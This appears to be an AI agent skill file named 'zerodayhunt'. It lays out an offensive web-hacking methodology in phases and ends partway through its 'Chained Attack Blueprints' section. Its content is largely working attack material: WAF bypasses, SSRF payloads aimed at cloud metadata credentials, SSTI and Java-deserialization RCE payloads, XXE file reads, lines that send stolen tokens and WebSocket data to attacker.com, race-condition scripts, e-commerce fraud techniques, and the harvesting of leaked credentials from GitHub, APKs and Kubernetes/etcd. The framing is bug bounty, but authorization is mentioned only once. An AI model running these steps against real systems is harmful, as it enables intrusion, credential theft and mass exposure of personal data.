---
name: zerodayhunt
description: Use when hunting for zero-days, backdoors, RCE, supply chain attacks, JWT vulnerabilities, cache poisoning, HTTP smuggling, dependency confusion, source map exposure, GSRM/WAF bypass, internal admin panel exposure, business logic flaws, race conditions, subdomain takeover, cloud misconfigs, mobile APK secrets, OAuth attacks, CORS misconfigs, serialization/SSTI/XXE, CI/CD pipeline attacks, or chained attack vectors. Also use when user says "find zero day", "hunt backdoor", "find RCE", "go deep", "maximum potential", "find critical", "chain attack", or "elite hunt".
---

# Zero-Day & Critical Vulnerability Hunt

## Philosophy
Automated tools find known CVEs. This skill finds what scanners miss:
logic flaws, architecture leaks, supply chain vectors, auth bypasses,
and chained attacks. Evidence required before claiming ANY finding.
Never hallucinate - if you didn't see it in a response body, it didn't happen.

**The rule that separates elite from script kiddie:** A single finding is rarely Critical.
The payout comes from CHAINING. SSRF + AWS metadata = IAM creds = cloud takeover.
Info disclosure + IDOR = mass PII = Critical. Always ask: "What can I do WITH this?"

**Critical rule:** NEVER stop at "SSRF/network reachability possible" or "endpoint exists".
Must prove full chain: credentials extracted, PII accessed, or data exfiltrated.
A 200 with empty body = WAF catch-all, not a real finding.

## ARGUMENTS
`<target>` - domain (e.g. target.com)
`<focus>` - optional: RCE / SSRF / IDOR / SUPPLY-CHAIN / JWT / BUSINESS-LOGIC / CHAIN / ALL

---

## Phase 1 - Read Prior Intel

```bash
cat ~/pentest-toolkit/results/<target>/interesting_recon.md 2>/dev/null
cat ~/pentest-toolkit/results/<target>/interesting_secrets.md 2>/dev/null
cat ~/pentest-toolkit/results/<target>/interesting_exploit.md 2>/dev/null
cat ~/pentest-toolkit/results/<target>/interesting_zerodayhunt.md 2>/dev/null
```

Extract and build a mental model:
- Live internal hostnames and IPs -> SSRF targets
- Known auth tokens / API keys -> test live, try privilege escalation
- Internal network ranges (10.x.x.x, 172.x.x.x) -> SSRF target list
- Technology stack (Spring Boot, React, nginx, APISIX, Vert.x, Node.js, etc.)
- Any leaked credentials or signing keys -> test immediately
- WAF type (Cloudflare, GSRM, custom) -> pick bypass strategy
- User IDs, order IDs seen so far -> IDOR enumeration input

---

## Phase 2 - WAF Fingerprinting & Bypass Classification

**Enterprise/GSRM-style WAF pattern (common in e-commerce and large-scale targets):**
```
BLOCKED response: HTTP 200 with body {"status":403,"message":"..."} or empty body
REAL response:    HTTP 200 with actual JSON data, OR HTTP 400/417/500 with JSON error

Rule: HTML 403 = WAF block. JSON 40x/50x = app processed = endpoint exists.
Empty 200 = catch-all WAF block = NOT real exposure.
```

**WAF bypass techniques (ranked by success rate):**
```bash
# 1. IP header spoofing
-H "X-Forwarded-For: 127.0.0.1"
-H "X-Real-IP: 10.0.0.1"
-H "True-Client-IP: 127.0.0.1"
-H "CF-Connecting-IP: 127.0.0.1"

# 2. Path obfuscation
/actuator%2fenv        # URL encode slash
/actuator/./env        # dot segment
/actuator//env         # double slash
//actuator/env         # leading double slash
/ACTuator/env          # case variation

# 3. Method switch
OPTIONS /admin/         # sometimes bypasses auth
HEAD /actuator/env      # headers only, may not trigger WAF body inspection
TRACE /                 # reveals proxy chain

# 4. Content-Type manipulation
-H "Content-Type: application/x-www-form-urlencoded"  # instead of JSON
-H "Content-Type: text/xml"  # triggers XML parser (XXE opportunity)

# 5. Parameter pollution (send same param twice)
?id=1&id=2             # WAF sees first, app processes second
POST: param=safe&param=<payload>

# 6. Unicode normalization bypass
/admin%ef%b8%8f/       # Unicode variation selector
/ａdmin/               # fullwidth chars (U+FF41)

# 7. Internal IP as Host header
-H "Host: 10.0.0.1"    # some reverse proxies route differently
```

---

## Phase 3 - Response Header Mining (Zero-Effort High-Value Intel)

**Every HTTP response header is a finding opportunity. Run on ALL live hosts:**

```bash
curl -sI https://<target>/ 2>&1 | head -50
curl -sI https://api.<target>/ 2>&1 | head -50
curl -sI https://m.<target>/ 2>&1 | head -50
```

**High-value headers to extract:**

| Header | What it leaks |
|--------|---------------|
| `via-<company>-gateway` | Internal gateway name + Java class path |
| `header-cmdb-name` | CMDB identifier for PCI/prod infrastructure |
| `header-cmdb-app-name` | Application name in asset inventory |
| `x-internal-tag` | Internal service routing tag |
| `x-terminal-config` | A/B test flags (product roadmap) |
| `x-apisix-upstream-status` | Backend health (500 = crashed upstream) |
| `x-gw-traceid` | Distributed trace ID |
| `server: APISIX/x.y.z` | Gateway version (search CVEs) |
| `server: nginx/1.x` | Nginx version (search CVEs) |
| `x-powered-by` | Framework version disclosure |
| `biz-code` | Internal business logic routing code |
| `frsys` | Internal routing flag |
| `via` | Proxy chain disclosure |

**Token extraction and forging:**
```bash
# Decode custom token from response headers
# Many apps use non-standard token formats: <prefix>.<base64-payload>.<signature>
# Example: token: PREFIX.eyJ1c2VyX3R5cGUiOiJndWVzdCIsInVzZXJfaWQiOjB9.abcdef12
echo "eyJ1c2VyX3R5cGUiOiJndWVzdCIsInVzZXJfaWQiOjB9" | base64 -d
# {"user_type":"guest","user_id":0}
# user_type=guest -> try forging user_type=admin or user_type=internal
# Signature is weak (truncated hash) -> try brute force or null-key forge
```

---

## Phase 4 - GitHub Organization Deep Scan

**Goal:** Find hardcoded credentials, internal endpoints, encryption keys.

```python
# 1. List all public repos
GET https://api.github.com/orgs/<org>/repos?per_page=100&type=public

# 2. For each repo - get full file tree
GET https://api.github.com/repos/<org>/<repo>/git/trees/main?recursive=1

# 3. Priority files (highest credential density):
# - src/test/java/**/*Tests*.java  <- test creds = REAL creds for test env (proven technique)
# - demo/*, examples/*, sample/*
# - .github/workflows/*.yml        <- CI/CD secrets exposure (see Phase 22)
# - *.properties, *.yml, *.env

# 4. Keys to find:
# openKeyId, secretKey, appid, appSecret, password, token, key,
# AccessKeyId, SecretAccessKey, private_key, client_secret, GITHUB_TOKEN

# 5. Check ALL branches (dev, staging, feature/* branches have more secrets)
GET https://api.github.com/repos/<org>/<repo>/branches

# 6. Check DELETED secrets in git history
GET https://api.github.com/repos/<org>/<repo>/commits?per_page=100
# For suspicious commits (message: "remove key", "fix config"):
GET https://api.github.com/repos/<org>/<repo>/commits/<sha>
# Check the diff for what was removed
```

**Live credential test:**
```bash
# Test leaked API key immediately:
curl -s "https://api.<target>/endpoint" \
  -H "Authorization: Bearer <found_token>"
# HTTP 200 with data = CONFIRMED LIVE
# HTTP 401 = expired/revoked (still report as CRED-STALE)
```

**Classify:**
- `[CRED-LIVE]` = tested against live server, returns 200 with data
- `[CRED-STALE]` = returns 401/403 on live server
- `[ENDPOINT]` = new internal API path discovered
- `[KEY]` = encryption/signing key
- `[INTERNAL-NS]` = internal package namespace (input to Phase 6)

---

## Phase 5 - JavaScript Bundle Analysis

**Goal:** Lazy-loaded chunks contain ALL real endpoints. Main bundle = nothing.
Scanners never fetch webpack chunks. This is a reliable zero-scanner finding.

```python
import re, requests

# Step 1: Get webpack manifest (maps chunk IDs to hashes)
r = requests.get("https://<target>/", headers={"User-Agent": "Mozilla/5.0"})
# Find manifest: manifest.abc123.bundle.js OR runtime~main.abc.js
manifest_matches = re.findall(r'"(/[^"]*manifest[^"]*\.js)"', r.text)

# Step 2: Parse chunk ID -> hash mapping from manifest
manifest_js = requests.get("https://<target>" + manifest_url).text
hashes = re.findall(r'"([a-f0-9]{8,})"', manifest_js)  # extract all chunk hashes

# Step 3: Guess chunk names (these are common in enterprise apps)
chunk_names = ["home", "dashboard", "admin", "chart", "order", "monitor",
               "index", "user", "setting", "report", "alert", "config",
               "finance", "supplier", "warehouse", "ops", "risk"]
for name in chunk_names:
    for h in hashes:
        r = requests.get(f"https://<target>/static/js/{name}.{h}.chunk.js")
        if r.status_code == 200 and len(r.text) > 1000:
            # Extract patterns
            for pat in [r'url:"(/[^"]+)"', r'\.get\("(/[^"]+)"', r'\.post\("(/[^"]+)"',
                        r'path:"(/[^"]+)"', r'endpoint:"(/[^"]+)"']:
                print(re.findall(pat, r.text))

# Step 4: Also extract from bundle:
# - Internal hostnames: re.findall(r'[\w.-]+\.internal|[\w.-]+\.corp', js)
# - Auth header names (reveals signing scheme)
# - SSO URLs in auth error message strings
# - Encryption keys in constants
# - CI_COMMIT_SHA (maps to git history for secret hunting)
```

**Test discovered endpoints without auth first:**
```bash
curl -s "https://<target>/web/alert/query" -X POST -H "Content-Type: application/json" -d '{}'
# JSON 400/500 = endpoint past WAF = FINDING even if auth required
# {"code":400106,"message":"Non-SSO login not allowed"} = endpoint exists + SSO hostname leaked
```

---

## Phase 6 - Dependency Confusion Attack Surface

**Checklist (ALL required before reporting):**
- [ ] Namespace unclaimed on public registry (prove with API call)
- [ ] Target uses this namespace internally (stack trace, pom.xml, import statement)
- [ ] Private registry DNS confirmed (nexus.*, artifactory.*)

```bash
# npm scope check
curl https://registry.npmjs.org/-/org/<orgname>/package  # 404 = unclaimed

# Maven Central
curl "https://search.maven.org/solrsearch/select?q=g:<groupId>&rows=5&wt=json"
# numFound:0 = unclaimed

# Find internal groupIds from Spring Boot error stack traces:
# "com.example.internal.api" in stack trace = internal Java package

# Confirm private registry:
dig nexus.<target-corp>.com    # private IP = Nexus confirmed
dig artifactory.<target-corp>.com

# PyPI for Python targets
curl https://pypi.org/pypi/<package-name>/json  # 404 = unclaimed
```

**NEVER publish. Report as:** "PoC available as DNS-only proof upon written authorization."

---

## Phase 7 - JWT & OAuth Attack Vectors

```python
# Decode any JWT
import base64, json
def b64d(s): return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
header  = json.loads(b64d(token.split('.')[0]))
payload = json.loads(b64d(token.split('.')[1]))

# JWT-specific attacks:
# 1. Algorithm confusion: RS256 -> HS256 (sign with public key as HMAC secret)
# 2. None algorithm: change alg to "none", remove signature
# 3. kid injection: kid=../../dev/null, kid='; SELECT 'x' --
# 4. jku/x5u injection: point to attacker-controlled JWKS
# 5. Role escalation: "roles": ["ROLE_ADMIN"] if payload has role claim
# 6. tenantId manipulation: change to internal tenant
# 7. Embedded PII: private IP in email field (architecture leak)

# OAuth 2.0 attack vectors:
# 1. State parameter CSRF - is state validated? If not, CSRF on login
GET /oauth/authorize?client_id=X&redirect_uri=Y&state=ATTACKER_CONTROLLED

# 2. Redirect URI manipulation
# Try: redirect_uri=https://evil.com (if validation is prefix-only)
# Try: redirect_uri=https://legit.target.com.evil.com
# Try: redirect_uri=https://legit.target.com@evil.com
# Try: redirect_uri=https://legit.target.com/../../evil
# If open redirect exists anywhere on target domain - chain it here

# 3. Token leakage via Referer
# If auth code in URL and page loads external resources -> code in Referer

# 4. Authorization code reuse
# Try submitting same code twice - is it invalidated after first use?

# 5. Client credentials in JS bundle (see Phase 5)
# client_id + client_secret in frontend = can generate tokens as app
```

---

## Phase 8 - SSRF Hunting

**Setup listener:** interactsh (`interactsh-client`) or webhook.site

**SSRF-prone parameters:**
```
url=, redirect=, next=, return=, callback=, webhook=
image_url=, avatar=, logo=, thumbnail=, icon=, pdf=
feed=, import=, fetch=, load=, src=, endpoint=
host=, domain=, service=, proxy=
```

**Payloads (escalate in order):**
```bash
# Tier 1: OOB detection
url=http://<interactsh-url>/test

# Tier 2: Cloud metadata (Critical if hits)
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
url=http://169.254.170.2/v2/credentials                                  # AWS ECS
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token  # GCP (need: -H "Metadata-Flavor: Google")
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure

# Tier 3: Kubernetes metadata (if K8s deployment confirmed)
url=http://169.254.169.254/latest/meta-data/  # some K8s expose EC2 metadata
url=http://10.0.0.1/                           # K8s API server (common internal IP)
url=http://kubernetes.default.svc/api/v1/namespaces/default/secrets  # K8s secrets

# Tier 4: Internal hosts from Phase 1 (use IPs discovered in recon)
url=http://10.x.x.x/          # Internal GitLab (from recon)
url=http://10.x.x.x/          # Internal Nexus/Artifactory (from recon)
url=http://127.0.0.1:8080/actuator/env

# Tier 5: WAF bypass variants
url=http://0x7f000001/       # hex IP
url=http://127.1/            # short form
url=http://[::1]/            # IPv6
url=http://①②⑦.⓪.⓪.①/   # unicode
# DNS rebinding: register domain that resolves to 127.0.0.1 after first lookup
```

**Confirm:** Only CONFIRMED if response body has internal data. Callback alone = POTENTIAL.

---

## Phase 9 - Business Logic Exploitation

**Scanners NEVER find these. Highest payout-per-hour in e-commerce bug bounty.**

```bash
# 1. Negative quantity / price manipulation
POST /cart/add  {"product_id": 123, "quantity": -1}
POST /checkout  {"price": -99.99}  # becomes credit?
# Expected: 400 error. Vulnerable: proceeds with negative total

# 2. Integer overflow in quantity
POST /cart/add  {"quantity": 9999999999}
# Can cause price to overflow to 0 or negative

# 3. Coupon / promo code stacking
POST /checkout  {"coupons": ["CODE1", "CODE1", "CODE1"]}  # same code 3x
POST /checkout  {"coupons": ["CODE1", "CODE2"]}  # if each gives 50% off = 100% off?

# 4. Refund after order modification
# 1. Place order for $100 item
# 2. Modify order to remove expensive item (replace with $1 item)
# 3. Request full refund - does it refund $100 for a $1 order?

# 5. Loyalty points double-spend
# 1. Redeem points in checkout
# 2. Quickly cancel order
# 3. Are points restored AND charged?
# Use race condition: fire cancel+refund simultaneously

# 6. Price reference race condition
# Add item at sale price -> sale ends -> checkout still has old price?
# Time between add-to-cart and checkout

# 7. Currency arbitrage
# Is price calculated server-side per currency, or stored at add-to-cart?
# Add to cart in currency A (cheap), checkout in currency B (expensive)

# 8. Referral fraud
POST /referral/apply  {"referral_code": <your_own_referral_code>}
# Can you refer yourself?

# 9. Gift card enumeration
GET /giftcard/balance?code=GIFT0000000001  # sequential codes?
# If codes are sequential, enumerate entire space
```

---

## Phase 10 - Race Conditions & TOCTOU

**Goal:** Exploit the gap between "check" and "use" to double-spend, bypass limits, or duplicate resources.**

```python
import asyncio, aiohttp

async def race(session, url, data):
    async with session.post(url, json=data) as r:
        return await r.json()

async def race_attack(url, data, count=20):
    async with aiohttp.ClientSession() as session:
        # Fire ALL requests at exact same moment
        tasks = [race(session, url, data) for _ in range(count)]
        results = await asyncio.gather(*tasks)
        return results

# Key race condition targets in e-commerce:
# 1. One-time coupon codes - use same code 20x simultaneously
#    -> Some requests succeed before server marks code as used
# 2. "Limited quantity" items - buy 20 units of 1-remaining item simultaneously
# 3. Referral bonus - claim bonus 20x in parallel
# 4. Password reset tokens - try to use same token from multiple IPs simultaneously
# 5. Rate limit bypass - 50 "forgot password" in one burst
# 6. Wallet/balance operations - withdraw simultaneously from two sessions

# Burp Suite: Turbo Intruder -> race_single_packet_attack.py
# HTTP/2 single packet attack: sends all requests in ONE TCP packet -> true simultaneity
```

---

## Phase 11 - Subdomain Takeover

**Goal:** Find dangling CNAMEs pointing to unclaimed cloud resources.**

```bash
# For every CNAME record found in recon:
dig +short <subdomain>.<target>

# If CNAME points to:
# *.github.io            -> check if GitHub Pages repo exists
# *.herokuapp.com        -> check if Heroku app exists
# *.azurewebsites.net    -> check if Azure app exists
# *.s3.amazonaws.com     -> check if S3 bucket exists (GET request)
# *.pantheonsite.io      -> check if Pantheon site exists
# *.fastly.net           -> check if Fastly service claimed
# *.shopify.com          -> check if Shopify store exists
# *.zendesk.com          -> check if Zendesk account exists

# Test S3 bucket takeover:
curl -I https://<subdomain>.<target>.com
# If response: "NoSuchBucket" or "InvalidBucketName" -> UNCLAIMED bucket

# Test GitHub Pages:
# If CNAME -> orgname.github.io, check if github.com/<orgname>/<repo> exists
# If not -> create repo, publish to Pages, you now control that subdomain

# Automated check:
nuclei -t takeovers/ -u https://<subdomain>.<target>

# Impact: host phishing page, steal OAuth tokens via redirect, XSS on target domain
```

---

## Phase 12 - Cloud Asset Enumeration

**Goal:** Find exposed S3/GCS buckets, Lambda URLs, misconfigured cloud storage.**

```bash
# S3 bucket enumeration (generate names from target brand)
# Replace <brand> with target company name and common variations
for name in <brand> <brand>corp <brand>-static <brand>-media <brand>-backup \
            <brand>-prod <brand>-dev <brand>-logs <brand>-assets <brand>-uploads; do
  curl -s "https://${name}.s3.amazonaws.com/" | grep -q "NoSuchBucket\|ListBucket" && echo "FOUND: $name"
done

# GCS bucket
for name in <brand> <brand>corp <brand>-static <brand>-cdn; do
  curl -s "https://storage.googleapis.com/${name}/" | grep -q "NoSuchBucket\|AccessDenied" && echo "FOUND: $name"
done

# AWS Lambda function URLs (unauthenticated by default if misconfigured)
# Pattern: https://<id>.lambda-url.<region>.on.aws/
# Found via: JS bundle, GitHub Actions workflow logs

# AWS Cognito misconfiguration
# Check identity pool in JS: AWS.config.region + IdentityPoolId
# If found: can get temporary IAM credentials via unauthenticated identity
aws cognito-identity get-id --account-id <id> --identity-pool-id <pool-id> --region <region>
aws cognito-identity get-credentials-for-identity --identity-id <id> --region <region>
# Temporary AWS creds = enumerate S3, DynamoDB, etc.

# S3 misconfig checks (if bucket found):
curl "https://<bucket>.s3.amazonaws.com/?list-type=2"  # list files
# Check for: db dumps, backup files, logs with user data, env files
```

---

## Phase 13 - Mobile APK Analysis

**Goal:** APKs contain hardcoded secrets and APIs that never appear in web.**

```bash
# 1. Download APK (from Google Play or APKPure)
# 2. Decompile with jadx
jadx -d ./apk_output <app>.apk

# 3. Hunt for secrets in decompiled source
grep -r "apiKey\|secretKey\|password\|token\|Bearer\|Authorization" ./apk_output/sources/
grep -r "http[s]://" ./apk_output/sources/ | grep -v "schema\|dtd\|android" | head -50

# 4. Check strings in resources
grep -r "key\|secret\|token" ./apk_output/resources/ | grep -v "\.png\|\.xml:" | head -50

# 5. Extract from native libraries
strings ./apk_output/lib/arm64-v8a/*.so | grep -E "Bearer|api[_-]?key|secret"

# 6. Check AndroidManifest.xml
cat ./apk_output/resources/AndroidManifest.xml
# Look for: exported activities, permissions, custom URL schemes, intent filters

# 7. Find hardcoded IPs / internal endpoints
grep -r "192\.168\.\|10\.\|172\.\|\.internal\|\.corp\|\.local" ./apk_output/sources/

# 8. Certificate pinning check
grep -r "CertificatePinner\|TrustManager\|X509\|pinning" ./apk_output/sources/
# If found: bypass with Frida or apk-mitm tool

# 9. Frida hook for runtime secret extraction (on rooted device / emulator)
frida -U -n <app-package> -e "
Java.perform(function() {
  var OkHttpClient = Java.use('okhttp3.OkHttpClient\$Builder');
  OkHttpClient.build.implementation = function() {
    var result = this.build();
    // Hook to intercept all HTTP requests including headers
    return result;
  };
});
"

# 10. Check for debug API endpoints in APK that don't exist on web
grep -r "/debug/\|/test/\|/internal/\|/admin/" ./apk_output/sources/
```

---

## Phase 14 - CORS & Host Header Injection

```bash
# CORS misconfiguration test
# 1. Origin reflection (any origin gets credentials?)
curl -s "https://api.<target>/user/profile" \
  -H "Origin: https://evil.com" \
  -H "Cookie: <session>" -I
# Vulnerable: "Access-Control-Allow-Origin: https://evil.com" + "Access-Control-Allow-Credentials: true"
# Exploit: attacker site makes authenticated request on victim's behalf

# 2. Null origin (from sandboxed iframe)
curl -s "https://api.<target>/user/profile" \
  -H "Origin: null" \
  -H "Cookie: <session>" -I
# Vulnerable: "Access-Control-Allow-Origin: null"

# 3. Trusted subdomain with XSS (chain CORS + XSS)
# If cors allows *.target.com and you find XSS on sub.target.com -> steal data

# Host header injection
# 1. Password reset poisoning
POST /forgot-password  {"email": "victim@example.com"}
-H "Host: evil.com"
# If reset link is "https://evil.com/reset?token=X" -> you receive the token

# 2. Web cache poisoning via Host header
curl "https://<target>/" -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"
# If host value reflected in page (e.g., in meta tags, links) -> cache poison

# 3. SSRF via Host header
-H "Host: 169.254.169.254"  # some reverse proxies forward Host as destination
```

---

## Phase 15 - Serialization, SSTI & XXE

**High-impact code execution vectors. Spring Boot (Java) = high-value target.**

```bash
# Java Deserialization (Spring Boot / any Java app accepting serialized objects)
# Look for endpoints accepting:
# Content-Type: application/x-java-serialized-object
# Content-Type: application/octet-stream with binary data starting with "aced 0005"
# Parameters named: object=, data=, payload=, serialized=

# Generate payload (requires ysoserial):
java -jar ysoserial.jar CommonsCollections6 "curl https://your-interactsh-url" | base64

# Server-Side Template Injection (SSTI)
# Test any field that appears reflected in response (name, message, subject)
# Payload ladder - try in order:
{{7*7}}          # Jinja2/Twig -> shows "49"
${7*7}           # Freemarker/Velocity -> shows "49"
<%= 7*7 %>       # ERB (Ruby) -> shows "49"
#{7*7}           # Ruby string interpolation
*{7*7}           # Thymeleaf (Spring) -> shows "49"

# If {{7*7}} -> 49 (Jinja2): escalate to RCE:
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# If ${7*7} -> 49 (Freemarker): escalate to RCE:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# XXE (XML External Entity)
# Trigger: any XML file upload, SOAP endpoint, SVG upload, Excel/DOCX upload
# Payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

# OOB XXE (blind, for WAF bypass):
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-interactsh-url/?x=">]>

# SVG XXE (upload as image):
<svg xmlns="http://www.w3.org/2000/svg">
<image href="file:///etc/passwd"/>
</svg>
```

---

## Phase 16 - CI/CD Pipeline & GitHub Actions Analysis

**Goal:** Compromise the build pipeline = RCE on developer machines + access to all secrets.**

```bash
# 1. Read all GitHub Actions workflow files
GET https://api.github.com/repos/<org>/<repo>/contents/.github/workflows/
# Fetch each workflow YAML file

# 2. Look for pull_request_target (DANGEROUS - forks can access secrets)
# Vulnerable pattern:
on:
  pull_request_target:
    ...
jobs:
  test:
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out fork code!
      - run: ./build.sh  # fork's code runs with REPO secrets!

# 3. Script injection via PR title/body
# Vulnerable: run: echo "PR title: ${{ github.event.pull_request.title }}"
# Attack: PR title = "; curl https://attacker.com/?token=$SECRET"

# 4. Find exposed secrets in workflow logs
# GitHub Actions logs are PUBLIC for public repos
GET https://api.github.com/repos/<org>/<repo>/actions/runs?per_page=100
# Look for runs with "environment variables" or "debug" output containing secrets

# 5. Self-hosted runner hijack
# If workflow uses: runs-on: self-hosted
# And repo accepts PRs from forks -> attacker can run code on company's self-hosted runner
# Self-hosted runners often have access to internal networks, cloud credentials

# 6. Reusable workflow injection
# Check for: uses: <org>/<repo>/.github/workflows/build.yml@main
# If that referenced repo has unclaimed namespace -> supply chain
```

---

## Phase 17 - GraphQL Attack Vectors

```bash
# 1. Introspection (reveals entire API schema)
curl -s "https://<target>/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}"}'
# If returns full schema -> enumerate all queries/mutations

# 2. Find GraphQL endpoint if not obvious
/graphql, /graphiql, /api/graphql, /query, /gql, /v1/graphql

# 3. Field suggestion attack (even if introspection disabled)
{"query": "{user{emial}}"}  # typo
# Returns: "Did you mean 'email'?" -> field name confirmed despite no introspection

# 4. Batch query abuse (rate limit bypass)
[{"query": "{user(id:1){email}}"}, {"query": "{user(id:2){email}}"}, ...]
# Send 100 queries in one HTTP request -> bypass per-request rate limits

# 5. IDOR via GraphQL ID
{"query": "{order(id: \"ORDER_123\"){items total userEmail}}"}  # try other IDs

# 6. Nested query DoS
{"query": "{users{friends{friends{friends{friends{friends{email}}}}}}}"}  # deep nesting

# 7. Mutation IDOR
{"mutation": "updateUser(id: \"OTHER_USER_ID\", email: \"attacker@evil.com\") {success}"}
```

---

## Phase 18 - Source Map & Build Artifact Exposure

```bash
# For each JS bundle URL:
curl https://<target>/static/js/main.abc123.chunk.js.map  # webpack source map

# Common paths:
/_next/static/chunks/pages/*.js.map   # Next.js
/assets/index.js.map                  # Vite
/static/js/*.js.map                   # CRA

# Source maps contain ORIGINAL unminified TypeScript/JSX source code
# In source map: look for hardcoded keys, internal comments, TODO: security issues

# Git exposure:
curl https://<target>/.git/config     # confirms git repo, remote URL
curl https://<target>/.git/HEAD       # current branch name
curl https://<target>/.git/COMMIT_EDITMSG  # last commit message
# Use tool: git-dumper to download entire repo if exposed

# Other artifacts:
curl https://<target>/.env
curl https://<target>/config.js
curl https://<target>/api-docs.json
curl https://<target>/swagger.json
curl https://<target>/graphql -d '{"query":"{__schema{types{name}}}"}'

# Build metadata in HTML source:
grep -i "commit\|sha\|build\|version\|git" <page_source>
# Git SHA -> find that commit in public repo -> check removed secrets in diff
```

---

## Phase 19 - Internal Admin Panel Discovery

```bash
# Kubernetes health (no auth, almost always public)
/healthz, /readyz, /livez, /health

# Spring Boot actuator (403 = EXISTS even if blocked)
/actuator, /actuator/env, /actuator/httptrace, /actuator/mappings
/actuator/beans, /actuator/logfile, /actuator/metrics, /actuator/info

# Admin setup flows (try BEFORE login - often unauthenticated)
/auth/verify-system-admin-setup   # setup state = architecture leak
/auth/create-system-admin-auth    # 400 = accepts input (not 403 = auth)
/auth/forgot-password-auth        # 417 = SMTP not configured

# GraphQL introspection
POST /graphql  {"query": "{__schema{queryType{name}}}"}

# OpenAPI / Swagger (full API schema without auth)
/v2/api-docs, /v3/api-docs, /swagger-ui.html, /openapi.json

# Kubernetes API server (if found exposed)
curl https://<target>:6443/api/v1/namespaces/  # unauthenticated = Critical
curl https://<target>:8443/api/v1/secrets      # K8s secrets = all credentials
curl http://<target>:8080/api/v1/             # insecure port (rare but exists)

# Kubernetes dashboard
/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/

# etcd (K8s data store - all secrets unencrypted if exposed)
curl http://<target>:2379/v2/keys/?recursive=true  # all K8s secrets in plaintext

# Monitoring stacks
/grafana, /kibana, /_cat/indices, /_cluster/health, /metrics, /prometheus

# Enterprise WAF response classification:
# JSON 40x/50x = app processes request = past WAF = FINDING
# HTML 403 = WAF block
# {"completed":true} = setup state = FINDING
# {"message":"SMTP is not enabled"} = misconfiguration = FINDING
```

---

## Phase 20 - SSR Page Source Mining

```bash
curl -s "https://m.<target>/<country>/" | python3 -c "
import sys, re
html = sys.stdin.read()
# API endpoints
print('=== ENDPOINTS ===')
for m in re.findall(r'[\"\x27](/[a-z][a-z0-9/._-]{3,60})[\"\x27]', html):
    print(m)
# Secrets
print('=== SECRETS ===')
for m in re.findall(r'[\"\x27]([A-Za-z0-9+/]{20,}={0,2})[\"\x27]', html):
    print(m)
"

# What to look for:
# 1. Full API endpoint list (inline JSON config -> 149 endpoints in one page)
# 2. Bot detection blacklists (exact bypass strings)
# 3. OAuth client IDs (Google, Facebook, VK, Apple)
# 4. reCAPTCHA / hCaptcha site keys (use to build solver)
# 5. Internal feature flags / A/B test config (product roadmap)
# 6. CDN bucket names / S3 bucket names
# 7. Internal app IDs (APM, monitoring, error tracking)
# 8. Map SDK keys (AMap/Gaode, Mapbox, Google Maps)
# 9. Environment indicators (prod vs staging vs dev)
```

---

## Phase 21 - Timing Oracle Attacks

**Invisible to scanners. Use timing to confirm blind vulnerabilities without triggering WAF.**

```python
import time, statistics, requests

def timed_request(url, payload, headers=None):
    start = time.perf_counter()
    r = requests.get(url, params=payload, headers=headers, timeout=10)
    return time.perf_counter() - start, r

# 1. User enumeration via timing
# Valid user: server checks password (slow). Invalid user: server rejects immediately (fast).
valid_times   = [timed_request("/login", {"email": "known@target.com", "pass": "wrong"})[0] for _ in range(10)]
invalid_times = [timed_request("/login", {"email": "xxxnotexist@target.com", "pass": "wrong"})[0] for _ in range(10)]
print(f"Valid mean: {statistics.mean(valid_times):.4f}s")
print(f"Invalid mean: {statistics.mean(invalid_times):.4f}s")
# >20ms difference = user enumeration confirmed

# 2. Blind SQLi via timing (no SLEEP keyword needed, works through WAF)
baseline = timed_request("/search", {"q": "test"})[0]
heavy_q  = timed_request("/search", {"q": "test' AND (SELECT * FROM (SELECT(SLEEP(0)))x)--"})[0]
# NOT using SLEEP keyword. Instead:
heavy_q2 = timed_request("/search", {"q": "test' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 100000)--"})[0]
# If response time increases proportionally = blind SQLi confirmed

# 3. Blind SSRF timing confirmation
# Send SSRF to internal IP that exists vs one that doesn't
# Internal IP that exists: TCP handshake delay (fast timeout or connects)
# Non-existent: ICMP unreachable (instant)
existing_ip_time = timed_request("/fetch", {"url": "http://10.x.x.x/"})[0]  # use IP from recon
nonexist_ip_time = timed_request("/fetch", {"url": "http://10.200.255.254/"})[0]
# Different timing = SSRF confirmed even without OOB callback
```

---

## Phase 22 - WebSocket Hijacking & API Version Attacks

```javascript
// Cross-Site WebSocket Hijacking (CSWSH)
// If WebSocket handshake uses cookies (not explicit token), any page can hijack it
// Test: does WS handshake include Cookie header?
// If yes: create attacker page that opens WS to target:
var ws = new WebSocket("wss://target.com/ws");
ws.onmessage = function(e) { fetch("https://attacker.com/?d=" + btoa(e.data)); }
// If server sends chat history/user data on connect = Critical account takeover

// API versioning discovery - older versions often lack auth or validation
// Current API: /api/v3/user/profile  -> Try:
GET /api/v0/user/profile
GET /api/v1/user/profile
GET /api/v2/user/profile
GET /api/beta/user/profile
GET /api/internal/user/profile
GET /api/debug/user/profile
GET /v1/user/profile          // no /api/ prefix
GET /user/profile             // no version at all

// Also try adding internal flags that may unlock extra data:
-H "X-Debug: true"
-H "X-Internal: 1"
-H "X-Admin: true"
-H "X-Role: admin"
```

---

## Phase 23 - Chained Attack Blueprints

**The most impactful section. Chains = Critical findings. Single vulns = Medium at best.**

### Chain A: Info Disclosure -> IDOR -> Mass PII Exfil
```
1. Phase 3 (headers): Extract token format from response headers
2. Token structure reveals: newuid = sequential integer
3. Phase 7 (JWT): Decode auth token -> find user ID field
4. Swap your user ID with +1/-1 -> do you get other user's data?
5. If yes: extract name, address, phone, order history = CONFIRMED CRITICAL
Evidence needed: actual PII response with another user's data
```

### Chain B: SSRF -> Cloud Metadata -> Full AWS Access
```
